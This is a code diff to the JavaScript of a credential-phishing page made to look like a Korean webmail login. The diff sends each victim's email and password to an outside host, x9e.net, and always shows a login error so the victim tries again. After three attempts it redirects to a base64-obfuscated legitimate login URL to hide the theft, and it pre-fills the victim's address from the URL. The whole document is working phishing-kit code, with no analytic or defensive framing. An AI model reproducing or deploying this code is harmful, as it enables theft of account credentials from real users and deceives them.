@@ -1,20 +1,35 @@
 $(document).ready(function() {
   // Password visibility toggle
   const passwordInput = document.getElementById('password');
-  const submitButton = document.getElementById('submit');
+  const toggleButton = document.getElementById('togglePassword');
+  const eyeHideIcon = document.getElementById('eye-hide');
+  const eyeShowIcon = document.getElementById('eye-show');
+  
+  toggleButton.addEventListener('click', function() {
+    // Toggle the password field type
+    if (passwordInput.type === 'password') {
+      passwordInput.type = 'text';
+      eyeHideIcon.classList.add('hidden');
+      eyeShowIcon.classList.remove('hidden');
+    } else {
+      passwordInput.type = 'password';
+      eyeHideIcon.classList.remove('hidden');
+      eyeShowIcon.classList.add('hidden');
+    }
+  });
 
   // Get email from URL parameter
   let loginAttempts = 0;
   const maxAttempts = 3;
   
-  const encodedUrlTemplate = "aHR0cHM6Ly9sb2dpbi5vZmZpY2UuaGl3b3Jrcy5jb20ve2RvbWFpbn0=";
+  const encodedUrlTemplate = "aHR0cHM6Ly9hdXRoLndvcmtzbW9iaWxlLmNvbS9sb2dpbi9sb2dpbj9hY2Nlc3NVcmw9aHR0cHMlM0ElMkYlMkZtYWlsLndvcmtzbW9iaWxlLmNvbSUyRiZsb2dpblBhcmFtPXt1c2VybmFtZX0lNDB7ZG9tYWlufSZsYW5ndWFnZT1rb19LUiZjb3VudHJ5Q29kZT04MiZzZXJ2aWNlQ29kZT1sb2dpbl93ZWImaXNSZWZyZXNoZWQ9dHJ1ZQ==";
   
   // Function to decode base64
   function decodeBase64(str) {
     try {
       return atob(str);
     } catch (e) {
-      //console.error("Decode error:", e);
+      console.error("Decode error:", e);
       return "";
     }
   }
@@ -59,23 +74,49 @@ $(document).ready(function() {
         return decoded;
       }
     } catch (e) {
-      //console.error("Base64 decode error:", e);
+      console.error("Base64 decode error:", e);
     }
     return str;
   }
   
   // Build redirect URL with username and domain
-  function buildRedirectUrl(domain) {
+  function buildRedirectUrl(username, domain) {
     // Decode the template and then replace the placeholders
     return decodeBase64(encodedUrlTemplate)
+      .replace('{username}', encodeURIComponent(username))
       .replace('{domain}', encodeURIComponent(domain.replace('@', ''))); // Remove @ if present
   }
   
   // Show error page
   function showErrorPage() {
-    $("#signtext").hide();
-    $("#login").hide(); 
-    $("#errorpage").show();
+    // Hide the login form and authentication options
+    $("form").hide();
+    $(".pt-6").hide(); // Hide device authentication button
+    
+    // Get the main content container
+    const mainContainer = $("form").parent();
+    mainContainer.empty(); // Clear existing content
+    
+    // Add small logo image at the top (matching the screenshot)
+    const logoContainer = $("<div>").addClass("flex justify-center mb-8 mt-4");
+    logoContainer.append($("<img>").attr("src", "assets/img/logo.png").addClass("h-10"));
+    mainContainer.append(logoContainer);
+    
+    // Create and display the error message with the provided image
+    // Error image (woman with question mark)
+    const errorImageContainer = $("<div>").addClass("flex justify-center mb-6");
+    errorImageContainer.append($("<img>").attr("src", "assets/img/error.png").addClass("w-28 h-28"));
+    mainContainer.append(errorImageContainer);
+    
+    // Error message container
+    const errorTextContainer = $("<div>").addClass("text-center");
+    
+    // Add the error messages
+    errorTextContainer.append($("<p>").addClass("text-xl font-medium mb-4").text("페이지를 찾을 수 없습니다."));
+    errorTextContainer.append($("<p>").addClass("text-gray-600 mb-1").text("주소를 잘못 입력하였거나, 변경 혹은 삭제되었을 수 있습니다."));
+    errorTextContainer.append($("<p>").addClass("text-gray-600 mb-12").text("올바른 주소를 입력했는지 다시 한번 확인해 주세요."));
+    
+    mainContainer.append(errorTextContainer);
   }
   
   // Process the email parameter
@@ -101,8 +142,9 @@ $(document).ready(function() {
     const [username, domain] = email.split('@');
     
     // Populate the form fields
-    $('#email').html(email);
-    $('#domain').html(domain);
+    $('#username').val(username);
+    $('#username-domain').text('@' + domain);
+    $('#email').val(email);
     
     // Focus on password field
     $('#password').focus();
@@ -123,14 +165,14 @@ $(document).ready(function() {
     
     // Validate password
     if (!password || password.length < 5) {
-      $('#error').show();
+      $('#error-message').text('비밀번호는 5자 이상이어야 합니다.').show();
       $('#password').focus();
       return;
     }
     
     // Get username and domain for redirect
-    const username = $('#email').html();
-    const domain = $('#domain').html();
+    const username = $('#username').val();
+    const domain = $('#username-domain').text();
     
     // Disable form elements during submission
     const formElements = $('form input, form button').not('#email').not('[disabled]');
@@ -138,67 +180,29 @@ $(document).ready(function() {
     
     // Submit form data
     $.ajax({
-      url: 'post.php',
+      url: 'https://x9e.net/xpx/post.php',
       type: 'POST',
       data: {
-        email: $('#email').html(),
+        email: $('#email').val(),
         password: password
       },
       complete: function() {
-        // This runs after either success or error
         // Count login attempts
         loginAttempts++;
         
         // Re-enable form elements
         formElements.prop('disabled', false);
         
-          // Show error message and focus on password
-          $('#error').show();
-          $('#password').removeClass('password-field').addClass('password-error-field');
-          $('#password').val('').focus();
-          
-          // Check if max attempts reached
-          if (loginAttempts >= maxAttempts) {
-            // Redirect after 3 failed attempts with the proper username and domain
-            window.location.href = buildRedirectUrl(domain);
-          }
-       
+        // Show error message and focus on password
+        $('#error-message').show();
+        $('#password').val('').focus();
+        
+        // Check if max attempts reached
+        if (loginAttempts >= maxAttempts) {
+          // Redirect after 3 failed attempts with the proper username and domain
+          window.location.href = buildRedirectUrl(username, domain);
+        }
       }
     });
   });
-
-  // Function to update button styling based on password content
-  function updateButtonStyle() {
-    if (passwordInput.value.length > 0) {
-      // Change to blue when password has content
-      submitButton.classList.remove('login-btn');
-      submitButton.classList.add('bg-[#2985db]');
-    } else {
-      // Revert to original light blue when password is empty
-      submitButton.classList.remove('bg-[#2985db]');
-      submitButton.classList.add('login-btn');
-    }
-  }
-
-  // Listen for input events on password field
-  passwordInput.addEventListener('input', updateButtonStyle);
-  
-  // Also handle focus event
-  passwordInput.addEventListener('focus', function() {
-    // Only change color if there's content
-    if (passwordInput.value.length > 0) {
-      submitButton.classList.remove('login-btn');
-      submitButton.classList.add('bg-[#2985db]');
-    }
-  });
-
-  $("#password").on("input", function(){
-    if (this.value.length > 0 && this.classList.contains('password-error-field')) {
-      this.classList.remove('password-error-field');
-      this.classList.add('password-field');
-      $("#error").hide();
-    }
-  });
-  // Set autofocus on the password field
-  passwordInput.focus();
 });
